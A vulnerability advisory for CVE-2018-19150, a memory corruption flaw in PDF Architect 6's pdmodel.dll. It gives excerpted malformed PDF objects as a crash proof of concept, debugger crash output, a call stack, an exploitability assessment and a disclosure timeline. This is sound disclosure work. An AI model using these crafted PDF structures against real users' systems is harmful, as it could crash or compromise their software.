---
layout: post
title:  "CVE-2018-19150 - PDF Architect 6 - pdmodel.dll Memory Corruption Vulnerability"
date:   2018-09-19 03:39:03 +0700
tags:
    - CVE-2018-19150
---

Description
-----------
PDF Architect helps you to get the most out of your PDF files. The application is exceptionally light, easy-to-use and flexible. It is the advanced PDF solution with everything you need to customize, secure, and collaborate on your PDF documents. We've included all the necessary features for home and professional users alike who wish to streamline their workflow.

Root Cause
----------
A memory corruption vulnerability exists in PDF Architect software. The vulnerability is due to an error in the PDF Architect when 
handling PDF files that contain specially crafted file. A remote attacker could trigger these flaws via a specially crafted PDF file. 
Successful exploitation cause a memory corruption, causing the application to crash, and may allow execution of arbitrary code once a
malicious PDF file is loaded on a vulnerable system.

Vulnerable module, **pdmodel.dll**.

Proof of concept can be construct as in following:
```
...cut here...
6 0 obj<<
  /FunctionType 4
  /Domain [-340282299999999994960115009090224128000.000000 340282299999999994960115009090224128000.000000 -340282299999999994960115009090224128000.000000 340282299999999994960115009090224128000.000000 -340282299999999994960115009090224128000.000000 340282299999999994960115009090224128000.000000 -340282299999999994960115009090224128000.000000 340282299999999994960115009090224128000.000000 -340282299999999994960115009090224128000.000000 340282299999999994960115009090224128000.000000 -340282299999999994960115009090224128000.000000 340282299999999994960115009090224128000.000000 -340282299999999994960115009090224128000.000000 340282299999999994960115009090224128000.000000 ]
  /Range [-340282299999999994960115009090224128000.000000 340282299999999994960115009090224128000.000000 -340282299999999994960115009090224128000.000000 340282299999999994960115009090224128000.000000 -340282299999999994960115009090224128000.000000 340282299999999994960115009090224128000.000000 ]
  /Length 3
>>
...cut here...
8 0 obj
<<
  /Type /Shading
  /ShadingType 4
  /ColorSpace [/Pattern [/DeviceN [/Col0 /Col1 /Col2 /Col3 /Col4 /Col5 /Col6] /DeviceRGB 6 0 R]]
  /BitsPerCoordinate 8
  /BitsPerComponent 8
  /BitsPerFlag 8
  /Decode [0.0 640.0 0.0 480.0 0.0 1.0 0.0 1.0 0.0 1.0 0.0 1.0 0.0 1.0 0.0 1.0 0.0 1.0 0.0 1.0]
  /Length             ÿ        ÿ  ÿ      ÿÿ        
>>
stream
            ÿ        ÿ  ÿ      ÿÿ        endstream
endobj
...cut here...
```

Crash Analysis
--------------
Upon opening the PDF, the application architect.exe will trigger the crash below:
```
(20c.824): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\PDF Architect 6\pdmodel.dll - 
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\PDF Architect 6\pdrender.dll - 
pdmodel!PDMODELProvidePDModelHFT+0x41a:
00007ffb`b65907ea 488b01          mov     rax,qword ptr [rcx] ds:00000000`00000000=????????????????
```
Disassemble the crash path:
```
0:024> u
pdmodel!PDMODELProvidePDModelHFT+0x41a:
00007ffb`b65907ea 488b01          mov     rax,qword ptr [rcx]
00007ffb`b65907ed ff5038          call    qword ptr [rax+38h]
00007ffb`b65907f0 ffc8            dec     eax
00007ffb`b65907f2 83f806          cmp     eax,6
00007ffb`b65907f5 774f            ja      pdmodel!PDMODELProvidePDModelHFT+0x476 (00007ffb`b6590846)
00007ffb`b65907f7 4898            cdqe
00007ffb`b65907f9 488d1500f8f3ff  lea     rdx,[pdmodel (00007ffb`b64d0000)]
00007ffb`b6590800 8b8c825c080c00  mov     ecx,dword ptr [rdx+rax*4+0C085Ch]
```
It appears that the software is not protected with CFG (https://msdn.microsoft.com/en-us/library/windows/desktop/mt637065(v=vs.85).aspx). A potential code execution can be achieved via:
```
00007ffb`b65907ea 488b01          mov     rax,qword ptr [rcx]
00007ffb`b65907ed ff5038          call    qword ptr [rax+38h]
```
And from this path we can see it call for another unknown RAX value. Examining the call stack (displayed below):
```
0:019> kb
 # RetAddr           : Args to Child                                                           : Call Site
00 00007ffb`b6ec3a38 : 00000022`cde7dcb0 00007ffb`d2e4f821 00007ffb`d93e4b00 00000000`00000020 : pdmodel!PDMODELProvidePDModelHFT+0x41a
01 00007ffb`b6eba6ab : 00000022`cde7e1e0 00000022`cde7e1e0 00000000`00000000 00000022`89f75e80 : pdrender!CreateServiceObject+0x15988
02 00007ffb`b6ebb59e : 00000000`00000001 00000022`cde7de78 00000022`cde7e218 00007ffb`d2e4f821 : pdrender!CreateServiceObject+0xc5fb
03 00007ffb`b6eb2659 : 00000022`cde7dfb8 00000022`cde7dfb8 00000022`cde7df28 00000000`00000001 : pdrender!CreateServiceObject+0xd4ee
04 00007ffb`b6eb192c : 00000000`0000000c 00000022`ce1d5f40 00000022`cde7e1e0 00000022`cde7dfb8 : pdrender!CreateServiceObject+0x45a9
05 00007ffb`b6eb2079 : 00000022`cde7e0b0 00000022`ce1d5f50 00000022`cde7e050 00000000`000000b8 : pdrender!CreateServiceObject+0x387c
06 00007ffb`b6eb250e : 00000022`cde7e1e0 00000022`c24d5ff0 ffffffff`fffffffe 00000022`cde7e050 : pdrender!CreateServiceObject+0x3fc9
07 00007ffb`b6eba3e9 : 00000022`89f75e80 00000022`cde7e050 00000022`cde7e1e0 00000022`ce1ddef0 : pdrender!CreateServiceObject+0x445e
08 00007ffb`b6eacd81 : 00000022`d9090e70 00000022`d9090e70 00000022`d9090e70 00007ffb`b6ecea20 : pdrender!CreateServiceObject+0xc339
09 00007ffb`b6ead14c : 00000022`cde7e680 00000022`c24d5fe0 00000022`c2683ff0 00000022`c24d5fe0 : pdrender!ServiceObjectModuleOnFree+0xb611
0a 00007ffb`b6ead26e : 00000022`c2382ee0 00007ffb`b66d4868 00000022`c2382ee0 00007ffb`b6a2f428 : pdrender!ServiceObjectModuleOnFree+0xb9dc
0b 00007ffb`b6ead305 : 00000000`00000000 00000022`cde7e4e8 00000022`c23a8f60 00000000`00000000 : pdrender!ServiceObjectModuleOnFree+0xbafe
0c 00007ffb`b6ebe872 : 00000022`ce4eef60 00000022`cde7e980 00000022`d49adfe0 00000022`d49affe0 : pdrender!ServiceObjectModuleOnFree+0xbb95
0d 00007ffb`b6ec004b : 00000022`ce4eef60 00000000`00000000 00000022`ce4eef60 00000022`cde7e7f0 : pdrender!CreateServiceObject+0x107c2
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\PDF Architect 6\bl-views.dll - 
0e 00007ffb`b4d82dda : 00000000`3e800000 be800000`00000000 ffffffff`fffffffe 00000000`00000000 : pdrender!CreateServiceObject+0x11f9b
0f 00007ffb`b4d96f15 : 00000022`ce4eef60 00000022`cde7e870 00000000`00000000 00000000`00000001 : bl_views!CreateServiceObject+0x121a
10 00007ffb`b4d97ace : 00000022`89f75e80 00000022`d901efd0 00000022`89f75e80 00000022`cde7f160 : bl_views!CreateServiceObject+0x15355
11 00007ffb`b4d98481 : 00000022`ce92bf80 00000022`ce92bf80 00000022`cbc5cb60 00000022`00000026 : bl_views!CreateServiceObject+0x15f0e
12 00007ffb`b4db1768 : 00000022`ce92bf80 00007ffb`c464e7dc 00000022`cde7f150 00000000`00000021 : bl_views!CreateServiceObject+0x168c1
13 00007ffb`b4db1c5d : 00000022`c269dff8 00000022`cde7ec58 00000000`00000000 00000022`cde7ec30 : bl_views!CreateServiceObject+0x2fba8
14 00007ffb`b4d6230b : 00000022`922c2e40 00000000`00000000 00000022`d901eff0 00000000`01000002 : bl_views!CreateServiceObject+0x3009d
15 00007ffb`b4d66e8a : 00000022`c268df60 00007ffb`b4d6f4f0 00000022`d905cfa0 00000022`cde7f5d8 : bl_views!ServiceObjectModuleOnFree+0xbc41b
16 00007ffb`b4caca4f : 00000000`00000000 00000022`c269dfc0 ffffffff`fffffffe 00000022`ccbcff60 : bl_views!ServiceObjectModuleOnFree+0xc0f9a
17 00007ffb`b4cac33b : 00000022`d907cf70 00000022`d9030ed0 00000022`cde7f3c0 00000022`cde7f3c8 : bl_views!ServiceObjectModuleOnFree+0x6b5f
18 00007ffb`b4d6aafa : 00000000`00000000 00000000`00000000 00000022`d8ff6fd0 00000000`00000000 : bl_views!ServiceObjectModuleOnFree+0x644b
19 00007ffb`b4d6b059 : 00000022`cce06fd8 00000000`00000000 00000022`cde7f5f8 00000022`cde7f5d8 : bl_views!ServiceObjectModuleOnFree+0xc4c0a
1a 00007ffb`b4d6cd2e : 00000022`cce16f00 00007ffb`b519b5e0 00000022`cce76fd0 00000000`00000824 : bl_views!ServiceObjectModuleOnFree+0xc5169
1b 00007ffb`b4d6ca39 : 00000022`cde7f770 00007ffb`b519b5a1 00000022`cce46fd0 00000022`cce3cfd0 : bl_views!ServiceObjectModuleOnFree+0xc6e3e
1c 00007ffb`b50b46e3 : 00000022`cce42f60 00000022`cce42f60 00007ffb`b50b46a0 00000022`cce46fd0 : bl_views!ServiceObjectModuleOnFree+0xc6b49
1d 00007ffb`d2ea829d : 00000000`00000000 00007ffb`d2ea8240 00000022`cce46fd0 00000000`00000000 : bl_views!CreateServiceObject+0x332b23
1e 00007ffb`d9112d92 : 00007ffb`d2ea8240 00000022`cce46fd0 00000000`00000000 00000000`00000000 : ucrtbase!thread_start<unsigned int (__cdecl*)(void * __ptr64)>+0x5d
1f 00007ffb`d9309f64 : 00007ffb`d9112d70 00000000`00000000 00000000`00000000 00000000`00000000 : KERNEL32!BaseThreadInitThunk+0x22
20 00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : ntdll!RtlUserThreadStart+0x34
```
From this output (below), we can see the faulting instruction as well as the remaining instructions in the function block which 
triggered the exception. It’s important to note here, that exploitable makes the assumption that all data used during the faulting 
instruction contains tainted data. The exploitable plugin makes further assumptions as to which of the following instructions in 
this call block may also contain tainted data.
```
0:019> .load winext\msec.dll; !exploitable -m
VERSION:1.6.0.0
IDENTITY:HostMachine\HostUser
PROCESSOR:X64
CLASS:USER
QUALIFIER:USER_PROCESS
EVENT:DEBUG_EVENT_EXCEPTION
EXCEPTION_FAULTING_ADDRESS:0x0
EXCEPTION_CODE:0xC0000005
EXCEPTION_LEVEL:FIRST_CHANCE
EXCEPTION_TYPE:STATUS_ACCESS_VIOLATION
EXCEPTION_SUBTYPE:READ
FAULTING_INSTRUCTION:00007ffb`b65907ea mov rax,qword ptr [rcx]
BASIC_BLOCK_INSTRUCTION_COUNT:2
BASIC_BLOCK_INSTRUCTION:00007ffb`b65907ea mov rax,qword ptr [rcx]
BASIC_BLOCK_INSTRUCTION_TAINTED_INPUT_OPERAND:rcx
BASIC_BLOCK_INSTRUCTION:00007ffb`b65907ed call qword ptr [rax+38h]
BASIC_BLOCK_INSTRUCTION_TAINTED_INPUT_OPERAND:rax
BASIC_BLOCK_INSTRUCTION_TAINTED_INPUT_OPERAND:rcx
MAJOR_HASH:0x957e34f8
MINOR_HASH:0x78fa9a89
STACK_DEPTH:33
STACK_FRAME:pdmodel!PDMODELProvidePDModelHFT+0x41a
STACK_FRAME:pdrender!CreateServiceObject+0x15988
STACK_FRAME:pdrender!CreateServiceObject+0xc5fb
STACK_FRAME:pdrender!CreateServiceObject+0xd4ee
STACK_FRAME:pdrender!CreateServiceObject+0x45a9
STACK_FRAME:pdrender!CreateServiceObject+0x387c
STACK_FRAME:pdrender!CreateServiceObject+0x3fc9
STACK_FRAME:pdrender!CreateServiceObject+0x445e
STACK_FRAME:pdrender!CreateServiceObject+0xc339
STACK_FRAME:pdrender!ServiceObjectModuleOnFree+0xb611
STACK_FRAME:pdrender!ServiceObjectModuleOnFree+0xb9dc
STACK_FRAME:pdrender!ServiceObjectModuleOnFree+0xbafe
STACK_FRAME:pdrender!ServiceObjectModuleOnFree+0xbb95
STACK_FRAME:pdrender!CreateServiceObject+0x107c2
STACK_FRAME:pdrender!CreateServiceObject+0x11f9b
STACK_FRAME:bl_views!CreateServiceObject+0x121a
STACK_FRAME:bl_views!CreateServiceObject+0x15355
STACK_FRAME:bl_views!CreateServiceObject+0x15f0e
STACK_FRAME:bl_views!CreateServiceObject+0x168c1
STACK_FRAME:bl_views!CreateServiceObject+0x2fba8
STACK_FRAME:bl_views!CreateServiceObject+0x3009d
STACK_FRAME:bl_views!ServiceObjectModuleOnFree+0xbc41b
STACK_FRAME:bl_views!ServiceObjectModuleOnFree+0xc0f9a
STACK_FRAME:bl_views!ServiceObjectModuleOnFree+0x6b5f
STACK_FRAME:bl_views!ServiceObjectModuleOnFree+0x644b
STACK_FRAME:bl_views!ServiceObjectModuleOnFree+0xc4c0a
STACK_FRAME:bl_views!ServiceObjectModuleOnFree+0xc5169
STACK_FRAME:bl_views!ServiceObjectModuleOnFree+0xc6e3e
STACK_FRAME:bl_views!ServiceObjectModuleOnFree+0xc6b49
STACK_FRAME:bl_views!CreateServiceObject+0x332b23
STACK_FRAME:ucrtbase!thread_start<unsigned int (__cdecl*)(void * __ptr64)>+0x5d
STACK_FRAME:KERNEL32!BaseThreadInitThunk+0x22
STACK_FRAME:ntdll!RtlUserThreadStart+0x34
INSTRUCTION_ADDRESS:0x00007ffbb65907ea
INVOKING_STACK_FRAME:0
DESCRIPTION:Data from Faulting Address controls Code Flow
SHORT_DESCRIPTION:TaintedDataControlsCodeFlow
CLASSIFICATION:PROBABLY_EXPLOITABLE
BUG_TITLE:Probably Exploitable - Data from Faulting Address controls Code Flow starting at pdmodel!PDMODELProvidePDModelHFT+0x000000000000041a (Hash=0x957e34f8.0x78fa9a89)
EXPLANATION:The data from the faulting address is later used as the target for a branch.
```

Disclosure timeline:
```
1. Reported on May 23, 2018
2. Following up almost every week. Issue still exists.
3. Publish to public, 90 days. 
4. Request for CVE (CVE-2018-19150) and assigned on Nov 11, 2018.
```

References:

1. https://nvd.nist.gov/vuln/detail/CVE-2018-19150
2. https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2018-19150
